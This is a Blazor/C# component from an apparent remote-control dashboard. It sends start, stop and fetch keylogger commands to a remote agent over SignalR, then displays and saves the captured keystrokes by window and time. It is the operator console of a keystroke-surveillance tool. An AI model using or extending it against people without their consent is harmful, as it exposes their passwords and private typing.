@using RemoteControl.Shared.Models
@using RemoteControl.Shared.Constants
@using Microsoft.AspNetCore.SignalR.Client
@inject IJSRuntime JSRuntime
@inject NavigationManager Nav
@implements IAsyncDisposable

@* Keylogger Tab Component *@
<div class="keylogger-container">
    <!-- Control Buttons -->
    <div class="keylog-controls">
        <button class="control-btn start-btn @(IsRecording ? "btn-disabled" : "")" 
                @onclick="StartRecording" 
                disabled="@IsRecording">
            <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
            </svg>
            Start
        </button>
        <button class="control-btn stop-btn @(!IsRecording ? "btn-disabled" : "")" 
                @onclick="StopRecording" 
                disabled="@(!IsRecording)">
            <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"></path>
            </svg>
            Stop
        </button>
        <div class="controls-divider"></div>
        <button class="control-btn reset-btn" @onclick="ResetLogs">
            <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
            </svg>
            Reset
        </button>
        <button class="control-btn save-btn" @onclick="SaveLogs">
            <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
            </svg>
            Save
        </button>
        @if (IsRecording)
        {
            <span class="recording-indicator">
                <span class="rec-dot"></span>
                REC
            </span>
        }
    </div>

    <div class="terminal-window">
        <div class="terminal-content">
            @if (KeylogEntries.Count == 0)
            {
                <p class="log-empty">No keylog data. Press Start to begin recording.</p>
            }
            else
            {
                var grouped = GroupEntriesByWindow(KeylogEntries);
                @foreach (var group in grouped)
                {
                    @if (group.ShowSeparator)
                    {
                        <p class="log-separator">--- User switched to @group.WindowTitle ---</p>
                    }
                    <p class="log-entry">
                        <span class="log-timestamp">[@group.Timestamp.ToString("yyyy-MM-dd HH:mm:ss")]</span>
                        <span class="log-app">[@group.WindowTitle]:</span>
                        @group.Keys
                    </p>
                }
            }
            <span class="cursor-blink">_</span>
        </div>
    </div>
</div>

@code {
    // CascadingParameter from DeviceControl
    [CascadingParameter(Name = "AgentId")]
    public string AgentId { get; set; } = string.Empty;

    // SignalR
    private HubConnection? _hubConnection;
    private bool IsConnected => _hubConnection?.State == HubConnectionState.Connected;

    // UI State
    private bool IsRecording { get; set; } = false;
    private List<KeylogEntry> KeylogEntries { get; set; } = new();

    protected override async Task OnInitializedAsync()
    {
        await InitializeSignalR();
    }

    private async Task InitializeSignalR()
    {
        _hubConnection = new HubConnectionBuilder()
            .WithUrl(Nav.ToAbsoluteUri("/remotehub"))
            .WithAutomaticReconnect()
            .Build();

        _hubConnection.On<CommandResult>(HubEvents.CommandCompleted, OnCommandCompleted);

        try
        {
            await _hubConnection.StartAsync();
            Console.WriteLine("[Keylogger] SignalR connected");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Keylogger] SignalR error: {ex.Message}");
        }
    }

    private void OnCommandCompleted(CommandResult result)
    {
        Console.WriteLine($"[Keylogger] OnCommandCompleted: AgentId={result.AgentId}, Success={result.Success}, Data type={result.Data?.GetType().Name ?? "null"}");
        
        if (result.AgentId != AgentId) 
        {
            Console.WriteLine($"[Keylogger] Skipped - AgentId mismatch (expected {AgentId})");
            return;
        }
        if (!result.Success) return;

        // KeylogResult is stored in CommandResult.Data
        if (result.Data is System.Text.Json.JsonElement jsonElement)
        {
            Console.WriteLine($"[Keylogger] Data is JsonElement: {jsonElement.GetRawText().Substring(0, Math.Min(200, jsonElement.GetRawText().Length))}...");
            try
            {
                var keylogResult = System.Text.Json.JsonSerializer.Deserialize<KeylogResult>(
                    jsonElement.GetRawText(),
                    new System.Text.Json.JsonSerializerOptions { PropertyNameCaseInsensitive = true });
                
                Console.WriteLine($"[Keylogger] Parsed KeylogResult: Entries count = {keylogResult?.Entries?.Count ?? 0}");
                
                if (keylogResult?.Entries != null && keylogResult.Entries.Count > 0)
                {
                    KeylogEntries.AddRange(keylogResult.Entries);
                    Console.WriteLine($"[Keylogger] Added {keylogResult.Entries.Count} entries to UI");
                    InvokeAsync(StateHasChanged);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Keylogger] Parse error: {ex.Message}");
            }
        }
        else
        {
            Console.WriteLine($"[Keylogger] Data is NOT JsonElement, type = {result.Data?.GetType().Name ?? "null"}");
        }
    }

    private async Task StartRecording()
    {
        Console.WriteLine($"[Keylogger] StartRecording called. AgentId={AgentId}, IsConnected={IsConnected}");
        
        if (_hubConnection == null || !IsConnected) 
        {
            Console.WriteLine("[Keylogger] Not connected to SignalR!");
            return;
        }
        if (string.IsNullOrEmpty(AgentId)) 
        {
            Console.WriteLine("[Keylogger] AgentId is empty!");
            return;
        }

        IsRecording = true;
        StateHasChanged();

        var request = new CommandRequest { AgentId = AgentId, Type = CommandType.StartKeylogger };
        await _hubConnection.InvokeAsync("SendCommand", request);
        Console.WriteLine($"[Keylogger] Sent StartKeylogger to {AgentId}");
    }

    private async Task StopRecording()
    {
        Console.WriteLine($"[Keylogger] StopRecording called. IsConnected={IsConnected}");
        
        if (_hubConnection == null || !IsConnected) return;

        IsRecording = false;
        StateHasChanged();

        var request = new CommandRequest { AgentId = AgentId, Type = CommandType.StopKeylogger };
        await _hubConnection.InvokeAsync("SendCommand", request);
        Console.WriteLine("[Keylogger] Sent StopKeylogger");

        // Request final keylog data
        var getDataRequest = new CommandRequest { AgentId = AgentId, Type = CommandType.GetKeylogData };
        await _hubConnection.InvokeAsync("SendCommand", getDataRequest);
        Console.WriteLine("[Keylogger] Sent GetKeylogData");
    }

    private void ResetLogs()
    {
        KeylogEntries.Clear();
        Console.WriteLine("[Keylogger] Logs cleared");
    }

    private async Task SaveLogs()
    {
        if (KeylogEntries.Count == 0) return;

        var content = string.Join("\n", KeylogEntries.Select(e => 
            $"[{e.Timestamp:yyyy-MM-dd HH:mm:ss}] [{e.WindowTitle}]: {e.KeyPressed}"));
        
        var fileName = $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
        
        await JSRuntime.InvokeVoidAsync("downloadFile", fileName, content);
        Console.WriteLine($"[Keylogger] Saved to {fileName}");
    }

    public async ValueTask DisposeAsync()
    {
        if (_hubConnection != null)
        {
            await _hubConnection.DisposeAsync();
        }
    }

    // ====== Group entries by window for cleaner display ======
    private record KeylogGroup(DateTime Timestamp, string WindowTitle, string Keys, bool ShowSeparator);

    private List<KeylogGroup> GroupEntriesByWindow(List<KeylogEntry> entries)
    {
        var groups = new List<KeylogGroup>();
        if (entries.Count == 0) return groups;

        string? lastWindow = null;
        var currentKeys = new System.Text.StringBuilder();
        DateTime currentTimestamp = entries[0].Timestamp;
        string currentWindow = entries[0].WindowTitle;

        foreach (var entry in entries)
        {
            if (entry.WindowTitle != currentWindow)
            {
                // Save previous group
                groups.Add(new KeylogGroup(currentTimestamp, currentWindow, currentKeys.ToString(), lastWindow != null && lastWindow != currentWindow));
                
                // Start new group
                lastWindow = currentWindow;
                currentWindow = entry.WindowTitle;
                currentTimestamp = entry.Timestamp;
                currentKeys.Clear();
            }
            currentKeys.Append(entry.KeyPressed);
        }

        // Add last group
        if (currentKeys.Length > 0)
        {
            groups.Add(new KeylogGroup(currentTimestamp, currentWindow, currentKeys.ToString(), lastWindow != null && lastWindow != currentWindow));
        }

        return groups;
    }
}

<style>
    .keylogger-container {
        padding: 1rem;
        background-color: var(--card-bg);
        border-radius: 0 0 0.75rem 0.75rem;
        min-height: 400px;
    }

    /* Control Buttons */
    .keylog-controls {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        margin-bottom: 1rem;
        padding: 0.75rem;
        background-color: var(--table-bg);
        border-radius: 0.5rem;
        border: 1px solid var(--card-border);
    }

    .control-btn {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        padding: 0.5rem 1rem;
        font-size: 0.875rem;
        font-weight: 500;
        border-radius: 0.5rem;
        border: none;
        cursor: pointer;
        transition: all 0.2s;
        color: white;
    }

    .btn-icon {
        width: 1rem;
        height: 1rem;
    }

    .start-btn {
        background-color: #16a34a;
    }

    .start-btn:hover:not(.btn-disabled) {
        background-color: #15803d;
    }

    .stop-btn {
        background-color: #ef4444;
    }

    .stop-btn:hover:not(.btn-disabled) {
        background-color: #dc2626;
    }

    .reset-btn {
        background-color: #f97316;
    }

    .reset-btn:hover {
        background-color: #ea580c;
    }

    .save-btn {
        background-color: #3b82f6;
    }

    .save-btn:hover {
        background-color: #2563eb;
    }

    .btn-disabled {
        opacity: 0.5;
        cursor: not-allowed;
    }

    .controls-divider {
        width: 1px;
        height: 1.5rem;
        background-color: var(--card-border);
    }

    .recording-indicator {
        display: flex;
        align-items: center;
        gap: 0.375rem;
        margin-left: auto;
        padding: 0.375rem 0.75rem;
        background-color: rgba(239, 68, 68, 0.1);
        border: 1px solid rgba(239, 68, 68, 0.3);
        border-radius: 9999px;
        color: #ef4444;
        font-size: 0.75rem;
        font-weight: 700;
    }

    .rec-dot {
        width: 0.5rem;
        height: 0.5rem;
        background-color: #ef4444;
        border-radius: 50%;
        animation: pulse 1.5s infinite;
    }

    .log-empty {
        color: var(--text-tertiary);
        font-style: italic;
        text-align: center;
        padding: 2rem;
    }

    .terminal-window {
        background-color: var(--terminal-bg);
        padding: 1rem;
        border-radius: 0.5rem;
        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        font-size: 0.875rem;
        color: var(--terminal-text);
        height: 380px;
        overflow-y: auto;
        border: 1px solid var(--terminal-border);
    }

    .terminal-content {
        line-height: 1.6;
    }

    .log-entry {
        margin-bottom: 0.25rem;
        color: #10b981;
    }

    .log-timestamp {
        color: #10b981;
        font-weight: 500;
    }

    .log-app {
        color: #60a5fa;
        font-weight: 600;
    }

    .log-separator {
        color: var(--terminal-text-secondary);
        margin: 0.5rem 0;
        font-style: italic;
    }

    .cursor-blink {
        color: #10b981;
        animation: blink 1s infinite;
    }

    @@keyframes blink {
        0%, 49% { opacity: 1; }
        50%, 100% { opacity: 0; }
    }

    .terminal-window::-webkit-scrollbar {
        width: 8px;
    }

    .terminal-window::-webkit-scrollbar-track {
        background: var(--terminal-bg);
    }

    .terminal-window::-webkit-scrollbar-thumb {
        background: var(--terminal-border);
        border-radius: 4px;
    }
</style>